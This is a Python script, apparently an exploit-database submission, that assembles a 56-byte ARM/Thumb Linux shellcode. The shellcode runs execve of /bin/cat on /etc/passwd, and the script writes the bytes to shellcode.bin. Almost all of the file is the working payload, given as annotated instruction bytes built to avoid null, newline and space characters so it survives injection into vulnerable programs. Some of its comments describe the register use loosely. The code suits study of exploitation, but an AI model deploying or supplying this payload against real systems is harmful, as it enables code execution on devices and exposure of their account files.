'''
    Title       : Linux/ARM - execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL) - 56 bytes
    Date        : 2020-10-30
    Author      : cpuu (cpuu at icloud dot com)
    Tested on   : Raspberry Pi 3 Model B Rev 1.2, armv7l, GNU/Linux raspberrypi 5.4.51-v7+, 32bit
    Python      : 3.7.4
    
    An ARM Hardcoded Shellcode without 0x20, 0x0a, and 0x00.
    
    https://github.com/cpuu/arm_exploitation/blob/master/shellcode/bincat/etcpasswd/etcpasswd.py

    $ python3 etcpasswd.py

    $ ls -l shellcode.bin
    $ hexdump -v -e '"\\""x" 1/1 "%02x" ""' shellcode.bin 


'''

# shellcode = b"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x24\x33\x78\x46\x16\x30\x92\x1a\x02\x72\x05\x1c\x14\x35\x2a\x70\x69\x46\x8a\x60\x4b\x60\x08\x60\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x63\x61\x74\x78\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"

shellcode =  b"\x01\x30\x8f\xe2"    # add  r3, pc, #1      add 0x1 to pc to prepare the switch to thumb mode
shellcode += b"\x13\xff\x2f\xe1"    # bx   r3              switch to thumb mode
shellcode += b"\x24\x33"            # adds r3,  #36 ; 0x24
shellcode += b"\x78\x46"            # mov  r0,  pc         move pc to r0
shellcode += b"\x16\x30"            # adds r0,  #22        make r0 to point to string
shellcode += b"\x92\x1a"            # subs r2,  r2,  r2    put 0 in r2 
shellcode += b"\x02\x72"            # strb r2,  [r0,  #8]  store /bin/cat to the stack 
shellcode += b"\x05\x1c"            # adds r5,  r0,  #0    make r5 to point to the beginning of string. 
shellcode += b"\x14\x35"            # adds r5,  #20        make r5 to point to the end of string 
shellcode += b"\x2a\x70"            # strb r2,  [r5,  #0]  store nullbytes at the end of string 
shellcode += b"\x69\x46"            # mov  r1,  sp         put "/bin/cat" in r1 (argv[0]) 
shellcode += b"\x8a\x60"            # str  r2,  [r1,  #8]  put "/etc/passwd" in r2 (argv[1]) 
shellcode += b"\x4b\x60"            # str  r3,  [r1,  #4]  put NULL in r3 (envp) 
shellcode += b"\x08\x60"            # str  r0,  [r1,  #0]  put "/bin/cat" in r0 
shellcode += b"\x0b\x27"            # movs r7,  #11        put 11 in r7 for execve syscall 
shellcode += b"\x01\xdf"            # svc  1               call execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL) 
                                    # sring "/bin/catx/etc/passwd" 
shellcode += b"\x2f\x62\x69\x6e"    #.word    0x6e69622f   thumb instructions for "/bin" 
shellcode += b"\x2f\x63\x61\x74"    #.word    0x7461632f   thumb instructions for "/cat" 
shellcode += b"\x78\x2f\x65\x74"    #.word    0x74652f78   thumb instructions for "x/et" 
shellcode += b"\x63\x2f\x70\x61"    #.word    0x61702f63   thumb instructions for "c/pa" 
shellcode += b"\x73\x73\x77\x64"    #.word    0x64777373   thumb instructions for "sswd" 

newfile = open('./shellcode.bin', 'wb')
newfile.write((''.join(chr(i) for i in shellcode)).encode('charmap'))

